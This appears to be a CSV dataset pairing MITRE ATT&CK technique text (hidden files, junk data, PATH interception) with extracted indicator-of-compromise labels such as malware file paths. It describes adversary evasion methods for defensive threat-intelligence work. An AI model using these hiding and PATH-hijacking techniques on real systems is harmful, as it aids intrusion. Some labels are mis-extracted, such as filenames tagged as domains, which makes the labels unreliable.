tech_id,tech_name,text,section,ioc,ioc_value
T1564.001,Hidden Files and Directories,"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches ( dir /a  for Windows and  ls –a  for Linux and macOS).   On Linux and Mac, users can mark specific files as hidden simply by putting a ""."" as the first character in the file or folder name     [1]       [2]   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like ""ls"". Users must specifically change settings to have these files viewable.   Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app    [3]   . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.   Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",Description,file,attrib.exe
T1564.001,Hidden Files and Directories,"CoinTicker  downloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc, /private/tmp/.info.py, /private/tmp/.server.sh, ~/Library/LaunchAgents/.espl.plist, ~/Library/Containers/.[random string]/[random string].   [15]",Procedure Examples,domain,info.py
T1564.001,Hidden Files and Directories,"CoinTicker  downloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc, /private/tmp/.info.py, /private/tmp/.server.sh, ~/Library/LaunchAgents/.espl.plist, ~/Library/Containers/.[random string]/[random string].   [15]",Procedure Examples,domain,server.sh
T1564.001,Hidden Files and Directories,"CoinTicker  downloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc, /private/tmp/.info.py, /private/tmp/.server.sh, ~/Library/LaunchAgents/.espl.plist, ~/Library/Containers/.[random string]/[random string].   [15]",Procedure Examples,path,/private/tmp/.info
T1564.001,Hidden Files and Directories,"CoinTicker  downloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc, /private/tmp/.info.py, /private/tmp/.server.sh, ~/Library/LaunchAgents/.espl.plist, ~/Library/Containers/.[random string]/[random string].   [15]",Procedure Examples,path,~/Library/LaunchAgents/.espl
T1564.001,Hidden Files and Directories,The  Komplex  payload is stored in a hidden directory at  /Users/Shared/.local/kextd .   [1],Procedure Examples,path,/Users/Shared/.local
T1564.001,Hidden Files and Directories,MacSpy  stores itself in  ~/Library/.DS_Stores/     [29],Procedure Examples,path,~/Library/.DS
T1564.001,Hidden Files and Directories,Tropic Trooper  has created a hidden directory under  C:\ProgramData\Apple\Updates\  and  C:\Users\Public\Documents\Flash\ .   [46]      [47],Procedure Examples,path,C:\ProgramData\Apple\Updates
T1564.001,Hidden Files and Directories,Tropic Trooper  has created a hidden directory under  C:\ProgramData\Apple\Updates\  and  C:\Users\Public\Documents\Flash\ .   [46]      [47],Procedure Examples,path,C:\Users\Public\Documents\Flash
T1001.001,Junk Data,Mori  has obfuscated the FML.dll with 200MB of junk data.   [7],Procedure Examples,file,FML.dll
T1574.007,Path Interception by PATH Environment Variable,"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.   The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory,  %SystemRoot%\system32  (e.g.,  C:\Windows\system32 ), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.   For example, if  C:\example path  precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in  C:\example path  will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.",Description,path,"C:\example path  precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe"
T1574.007,Path Interception by PATH Environment Variable,"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.   The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory,  %SystemRoot%\system32  (e.g.,  C:\Windows\system32 ), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.   For example, if  C:\example path  precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in  C:\example path  will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.",Description,file,cmd.exe
T1574.007,Path Interception by PATH Environment Variable,"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.   The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory,  %SystemRoot%\system32  (e.g.,  C:\Windows\system32 ), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.   For example, if  C:\example path  precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in  C:\example path  will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.",Description,file,net.exe
